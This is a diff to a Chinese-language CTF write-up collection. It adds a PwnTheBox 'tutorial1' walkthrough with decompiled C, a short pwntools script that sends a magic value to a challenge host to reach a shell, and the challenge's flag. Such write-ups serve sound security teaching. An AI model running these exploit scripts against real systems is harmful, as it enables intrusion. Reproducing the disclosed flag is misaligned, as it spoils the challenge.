@@ -1848,6 +1848,65 @@ io.interactive()
 
 ## PwnTheBox
 
+### [tutorial1](https://ce.pwnthebox.com/challenges?type=4&id=948)
+
+先`file ./tutorial1`查看文件类型再`checksec --file=./tutorial1`检查了一下文件保护情况。
+
+使用`IDA pro 64bit`打开附件`tutorial1`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int buf; // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  puts("   _  __       ____  _       __ ");
+  puts("  | |/ /____  / __ \\(_)___  / /_");
+  puts("  |   // __ \\/ / / / / __ \\/ __/");
+  puts("  /   |/ /_/ / /_/ / / / / / /_ ");
+  puts(" /_/|_/ .___/\\____/_/_/ /_/\\__/  ");
+  puts("     /_/                         ");
+  puts("Welcome, freshman!");
+  puts("This is your first pwn challenge, right?");
+  puts("Try to get into backdoor!");
+  puts("Tell me your secret number:");
+  read(0, &buf, 4uLL);
+  if ( buf == -1162167622 ) // 0BABABABAh
+    backdoor();
+  else
+    puts("Well, you don't know the trick yet?");
+  return 0;
+}
+```
+
+当用户输入的`buf`变量为`0xbabababa`时会执行`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。
+
+```c
+int backdoor()
+{
+  puts("Well done! Go get your flag!");
+  return system("/bin/sh");
+}
+```
+
+编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{073e2a21-2013-44e8-992b-549d973b333c}`即可。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10134)
+io.sendlineafter(b':', p64(0xbabababa))
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/PwnTheBox/948/1.png)
+
+------
+
 ### [tutorial2](https://ce.pwnthebox.com/challenges?type=4&id=949)
 
 先`file ./tutorial2`查看文件类型再`checksec --file=./tutorial2`检查了一下文件保护情况。
@@ -1889,7 +1948,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-当用户输入的`buf`变量为`0xdeadbeef`时会输出`where to go?`语句，并执行用户输入的地址所存放的函数。在`Functions window`中有一个起始地址为`0x4006E6`的`backdoor()`函数，其函数返回值直接是`system("/bin/sh")`。
+当用户输入的`buf`变量为`0xdeadbeef`时会输出`where to go?`语句，并执行用户输入的地址所存放的函数。在`Functions window`中有一个起始地址为`0x4006E6`的`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。
 
 ```c
 int backdoor()
